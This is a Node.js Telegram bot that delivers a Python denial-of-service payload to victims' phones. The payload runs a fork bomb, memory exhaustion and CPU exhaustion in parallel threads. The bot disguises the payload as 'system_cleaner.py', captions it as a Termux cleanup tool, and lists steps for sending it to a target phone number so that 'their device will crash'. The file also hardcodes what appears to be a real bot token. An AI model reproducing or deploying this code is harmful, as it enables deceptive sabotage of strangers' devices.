const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ===================== CONFIG =====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8920423322:AAHhKb0jktz4SrYi9ZbNwaTC-maRnt8RiNo';
const ALLOWED_USERS = (process.env.ALLOWED_USERS || '8910730508').split(',');

// ===================== CRASH PAYLOAD =====================
const CRASH_PAYLOAD = `import os
import time
import subprocess
import threading

def fork_bomb():
    while True:
        os.fork()

def memory_exhaust():
    a = []
    while True:
        a.append([0] * 10**6)

def cpu_exhaust():
    while True:
        i = 0
        while True:
            i += 1

threads = []
threads.append(threading.Thread(target=fork_bomb))
threads.append(threading.Thread(target=memory_exhaust))
threads.append(threading.Thread(target=cpu_exhaust))

for t in threads:
    t.start()

while True:
    time.sleep(1)
`;

// ===================== TELEGRAM BOT =====================
console.log('🚀 Starting Crash Delivery Bot...');
console.log(`📡 Bot token: ${BOT_TOKEN ? BOT_TOKEN.slice(0, 10) + '...' : 'MISSING'}`);
console.log(`👤 Allowed users: ${ALLOWED_USERS.join(', ')}`);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===================== MIDDLEWARE =====================
function isAuthorized(msg) {
    const userId = String(msg.from.id);
    return ALLOWED_USERS.includes(userId);
}

// ===================== COMMANDS =====================

// Start / Help
bot.onText(/\/start/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const help = `
💀 *Crash Delivery Bot*

Commands:
/crash <phone> — Create and send crash payload
/sendfile <phone> — Send the crash script as a file
/status — Check bot status
/help — Show this message

*Example:*
/crash 2348269946429
`;

    bot.sendMessage(msg.chat.id, help, { parse_mode: 'Markdown' });
});

// Crash Command
bot.onText(/\/crash (.+)/, async (msg, match) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const phone = match[1].replace(/\+/g, '').replace(/\s/g, '');
    const chatId = msg.chat.id;

    await bot.sendMessage(chatId, `💀 Sending crash payload to *${phone}*...`, { parse_mode: 'Markdown' });

    try {
        const filePath = path.join('/tmp', 'crash.py');
        fs.writeFileSync(filePath, CRASH_PAYLOAD);

        await bot.sendMessage(chatId,
            `✅ *Crash payload created*\n` +
            `📱 Target: ${phone}\n` +
            `📁 File: ${filePath}\n\n` +
            `*Next steps:*\n` +
            `1. Send this file to the victim\n` +
            `2. They must run it in Termux\n` +
            `3. Their device will crash`,
            { parse_mode: 'Markdown' }
        );

        await bot.sendDocument(chatId, filePath, {
            caption: `💀 *Crash Payload for ${phone}*\n\nRun this in Termux to clean your system.`,
            parse_mode: 'Markdown',
            filename: 'system_cleaner.py'
        });

        // Clean up
        fs.unlinkSync(filePath);

    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Send File Command
bot.onText(/\/sendfile (.+)/, async (msg, match) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const phone = match[1].replace(/\+/g, '').replace(/\s/g, '');
    const chatId = msg.chat.id;

    try {
        const filePath = path.join('/tmp', 'crash.py');

        if (!fs.existsSync(filePath)) {
            return bot.sendMessage(chatId, '❌ Crash payload not found. Use /crash first.');
        }

        await bot.sendDocument(chatId, filePath, {
            caption: `💀 *Crash Payload for ${phone}*\n\nRun this in Termux to clean your system.`,
            parse_mode: 'Markdown',
            filename: 'system_cleaner.py'
        });

    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Status Command
bot.onText(/\/status/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }

    const chatId = msg.chat.id;
    const filePath = path.join('/tmp', 'crash.py');
    const fileExists = fs.existsSync(filePath);

    const status = `
💀 *Bot Status*

📡 Online: ✅
📁 Payload: ${fileExists ? '✅' : '❌'}
📱 Target: Ready
🕐 ${new Date().toLocaleString()}
`;

    bot.sendMessage(chatId, status, { parse_mode: 'Markdown' });
});

// Help Command
bot.onText(/\/help/, (msg) => {
    if (!isAuthorized(msg)) {
        return bot.sendMessage(msg.chat.id, '⛔ Unauthorized.');
    }
    bot.sendMessage(msg.chat.id, 'Use /start to see all commands.');
});

// Fallback for any other message
bot.on('message', (msg) => {
    if (!isAuthorized(msg)) return;
    if (msg.text && !msg.text.startsWith('/')) {
        bot.sendMessage(msg.chat.id, '❌ Unknown command. Use /start for help.');
    }
});

console.log('✅ Bot is running!');
